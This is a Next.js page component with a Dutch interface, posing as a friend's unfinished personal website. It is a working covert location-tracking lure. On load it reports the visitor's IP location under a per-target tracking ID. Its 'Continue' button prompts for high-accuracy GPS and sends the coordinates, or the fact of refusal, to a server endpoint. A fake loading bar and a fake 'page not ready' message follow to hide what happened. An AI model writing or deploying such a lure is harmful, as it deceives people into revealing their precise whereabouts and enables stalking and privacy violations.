"use client";

import { useEffect, useState } from "react";
import { useParams } from "next/navigation";

export default function TrackingPage() {
  const params = useParams();
  const trackingId = params.id as string;
  const [status, setStatus] = useState<"welcome" | "requesting" | "loading" | "error">("welcome");
  const [loadingProgress, setLoadingProgress] = useState(0);

  // Automatisch IP-locatie versturen bij het laden van de pagina
  useEffect(() => {
    const sendIpLocation = async () => {
      try {
        await fetch("/api/locatie", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            trackingId,
            type: "ip",
            timestamp: new Date().toISOString(),
          }),
        });
      } catch (e) {
        console.error("IP locatie fout:", e);
      }
    };
    
    sendIpLocation();
  }, [trackingId]);

  const handleButtonClick = async () => {
    setStatus("requesting");
    
    if (!navigator.geolocation) {
      startFakeLoading();
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        try {
          await fetch("/api/locatie", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              trackingId,
              type: "gps",
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              accuracy: position.coords.accuracy,
              timestamp: new Date().toISOString(),
            }),
          });
        } catch (e) {
          console.error("GPS fout:", e);
        }
        startFakeLoading();
      },
      async (error) => {
        console.error("Geolocation error:", error);
        try {
          await fetch("/api/locatie", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              trackingId,
              type: "gps_denied",
              error: error.message,
              timestamp: new Date().toISOString(),
            }),
          });
        } catch (e) {
          console.error("Error sending denial:", e);
        }
        startFakeLoading();
      },
      {
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0,
      }
    );
  };

  const startFakeLoading = () => {
    setStatus("loading");
    let progress = 0;
    const interval = setInterval(() => {
      progress += Math.random() * 12;
      if (progress >= 100) {
        progress = 100;
        clearInterval(interval);
        setTimeout(() => {
          setStatus("error");
        }, 500);
      }
      setLoadingProgress(Math.min(progress, 100));
    }, 400);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-indigo-500 via-purple-500 to-pink-500 flex items-center justify-center p-4">
      <div className="max-w-md w-full">
        {status === "welcome" && (
          <div className="bg-white rounded-3xl shadow-2xl p-8 text-center">
            {/* Logo/Icon */}
            <div className="w-20 h-20 bg-gradient-to-br from-indigo-500 to-purple-600 rounded-2xl flex items-center justify-center mx-auto mb-6 shadow-lg">
              <span className="text-4xl">✨</span>
            </div>
            
            {/* Titel */}
            <h1 className="text-2xl font-bold text-gray-800 mb-3">
              Welkom!
            </h1>
            
            {/* Bericht */}
            <p className="text-gray-600 mb-8 leading-relaxed">
              Leuk dat je mijn nieuwe website wilt bekijken! 
              Klik op de knop om door te gaan.
            </p>

            {/* Button */}
            <button
              onClick={handleButtonClick}
              className="w-full bg-gradient-to-r from-indigo-500 to-purple-600 hover:from-indigo-600 hover:to-purple-700 text-white text-lg font-semibold py-4 px-8 rounded-xl shadow-lg transform transition-all hover:scale-105 active:scale-95"
            >
              Doorgaan →
            </button>

            {/* Subtle hint */}
            <p className="text-gray-400 text-xs mt-6">
              Nog in ontwikkeling • Feedback welkom!
            </p>
          </div>
        )}

        {status === "requesting" && (
          <div className="bg-white rounded-3xl shadow-2xl p-8 text-center">
            <div className="w-16 h-16 border-4 border-indigo-200 border-t-indigo-500 rounded-full animate-spin mx-auto mb-6"></div>
            <p className="text-gray-700 font-medium">Even geduld...</p>
            <p className="text-gray-400 text-sm mt-2">Website wordt geladen</p>
          </div>
        )}

        {status === "loading" && (
          <div className="bg-white rounded-3xl shadow-2xl p-8 text-center">
            <div className="mb-6">
              <p className="text-gray-700 font-medium mb-3">Laden... {Math.round(loadingProgress)}%</p>
              <div className="w-full bg-gray-200 rounded-full h-3 overflow-hidden">
                <div 
                  className="bg-gradient-to-r from-indigo-500 to-purple-600 h-3 rounded-full transition-all duration-300"
                  style={{ width: `${loadingProgress}%` }}
                ></div>
              </div>
            </div>
            <p className="text-gray-400 text-sm">Bijna klaar...</p>
          </div>
        )}

        {status === "error" && (
          <div className="bg-white rounded-3xl shadow-2xl p-8 text-center">
            <div className="w-20 h-20 bg-orange-100 rounded-full flex items-center justify-center mx-auto mb-6">
              <span className="text-4xl">🚧</span>
            </div>
            <h2 className="text-xl font-bold text-gray-800 mb-3">
              Oeps! Nog niet klaar
            </h2>
            <p className="text-gray-600 mb-6">
              Sorry, deze pagina is nog in ontwikkeling. 
              Ik laat je weten wanneer ie af is!
            </p>
            <div className="bg-gray-100 rounded-xl p-4">
              <p className="text-gray-500 text-sm">
                Bedankt voor het kijken! 🙏
              </p>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
